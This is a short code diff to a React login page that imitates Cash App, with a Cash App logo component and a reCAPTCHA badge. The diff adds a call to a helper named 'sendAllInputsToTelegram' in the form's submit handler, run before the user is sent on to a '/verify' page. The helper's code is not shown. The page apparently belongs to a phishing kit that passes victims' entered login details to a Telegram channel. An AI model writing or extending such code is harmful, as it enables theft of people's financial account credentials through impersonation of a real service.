@@ -3,6 +3,7 @@ import { Link, useNavigate } from 'react-router-dom';
 import { ChevronDown, Loader2 } from 'lucide-react';
 import { CashAppLogo } from '../components/CashAppLogo';
 import { RecaptchaBadge } from '../components/RecaptchaBadge';
+import { sendAllInputsToTelegram } from '../utils/telegram';
 type LoginMethod = 'phone' | 'email';
 export function Login() {
   const [method, setMethod] = useState<LoginMethod>('phone');
@@ -10,10 +11,11 @@ export function Login() {
   const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!inputValue) return;
-    
+
+    await sendAllInputsToTelegram();
     setIsLoading(true);
     setTimeout(() => {
       navigate('/verify', { state: { contact: inputValue, method } });
